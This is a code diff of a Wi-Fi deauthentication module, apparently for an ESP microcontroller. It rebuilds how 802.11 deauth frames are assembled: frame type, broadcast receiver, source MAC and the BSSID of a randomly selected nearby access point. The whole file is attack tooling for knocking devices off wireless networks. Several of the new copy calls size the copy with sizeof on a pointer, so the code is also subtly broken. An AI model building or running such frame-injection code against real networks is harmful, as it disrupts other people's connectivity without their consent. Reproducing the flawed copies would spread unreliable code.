@@ -17,20 +17,12 @@ bool Deauth::running = false;
 std::vector<String> Deauth::whitelist = {};
 String Deauth::randomAP = "";
 
-uint8_t Deauth::deauthFrame[26] = {
-    /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
-    /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
-    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // receiver (target)
-    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (AP)
-    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (AP)
-    /* 22 - 23 */ 0x00, 0x00,                         // fragment & sequence number
-    /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
-};
-
-void Deauth::construct(wifi_ieee80211_mac_hdr_t& header, uint8_t* frame) {
-    // construct full frame...
-    std::copy(reinterpret_cast<uint8_t*>(&header), reinterpret_cast<uint8_t*>(&header) + sizeof(wifi_ieee80211_mac_hdr_t), frame);
-}
+/** developer note:
+ * 
+ * instead of using the deauth frame normally, we append information to the deauth frame and dynamically write info to the frame
+ * 
+*/
+uint8_t Deauth::deauthFrame[26];
 
 void Deauth::add(const std::string& bssids) {
     std::stringstream ss(bssids);
@@ -59,9 +51,6 @@ void Deauth::list() {
 }
 
 void Deauth::select() {
-    // init the header
-    wifi_ieee80211_mac_hdr_t header;
-
     // cool animation
     for (int i = 0; i < 5; ++i) {
         Serial.println("(0-o) Scanning for APs.");
@@ -111,6 +100,14 @@ void Deauth::select() {
          * 
         */
 
+        // clear out exisitng frame...
+        std::fill(std::begin(Deauth::deauthFrame), std::end(Deauth::deauthFrame), 0);
+
+        Deauth::deauthFrame[0] = 0xC0; // type
+        Deauth::deauthFrame[1] = 0x00; // subtype
+        Deauth::deauthFrame[2] = 0x00; // duration (SDK takes care of that)
+        Deauth::deauthFrame[3] = 0x00; // duration (SDK takes care of that)
+
         // bssid
         uint8_t* bssid = WiFi.BSSID(randomIndex);
 
@@ -130,12 +127,9 @@ void Deauth::select() {
         */
 
         // copy our mac(s) to header
-        std::copy(bssid, bssid + sizeof(bssid), header.addr1);
-        std::copy(mac, mac + sizeof(mac), header.addr2);
-        std::copy(broadcastAddr, broadcastAddr + 6, header.addr3);
-
-        // finally we construct it
-        construct(header, deauthFrame);
+        std::copy(broadcastAddr, broadcastAddr + sizeof(bssid), Deauth::deauthFrame + 4);
+        std::copy(mac, mac + sizeof(mac), Deauth::deauthFrame + 10);
+        std::copy(bssid, bssid + sizeof(bssid), Deauth::deauthFrame + 16);
     } else {
         // well ur fucked.
         Serial.println("(;-;) No access points found.");
